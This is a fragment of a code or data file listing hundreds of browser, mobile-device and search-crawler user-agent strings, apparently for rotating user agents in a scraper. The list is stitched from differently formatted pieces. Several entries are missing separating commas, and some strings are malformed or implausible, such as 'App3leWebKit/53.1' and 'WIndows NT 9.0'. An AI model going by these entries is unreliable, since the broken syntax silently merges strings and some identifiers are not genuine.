	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 			"Googlebot-Image/1.0",
			"Googlebot-News",
			"Googlebot-Video/1.0",
			"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
			"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
			"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
			"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
			"HTMLParser/1.6",
			"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
			"iTunes/9.0.2 (Windows; N)",
                        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
			"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
			"Java/1.6.0_13",
			"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
			"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
			"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"libwww-perl/5.820",
			"Links/0.9.1 (Linux 2.4.24; i386;)",
			"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
			"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
			"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
			"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
			"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
			"Mediapartners-Google",
			"Microsoft URL Control - 6.00.8862",
			"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
			"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
			"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
			"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
			"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
			"Mozilla/2.02E (Win95; U)",
			"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
			"Mozilla/3.01Gold (Win95; I)",
			"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
			"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
			"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
			"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
			"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
			"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
			"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
			"Mozilla/4.8 [en] (Windows NT 5.1; U)",
 			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
                       "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
              "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
              "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
              "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
              "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
              "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
              "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
              "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
              "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
 			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
			"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
			"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
			"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
                        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7"
 			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0",
			"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12",
			"Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
			"Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13",
			"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0",
			"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
			"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420  (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145",
			"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941",
			"Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0 ",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3",
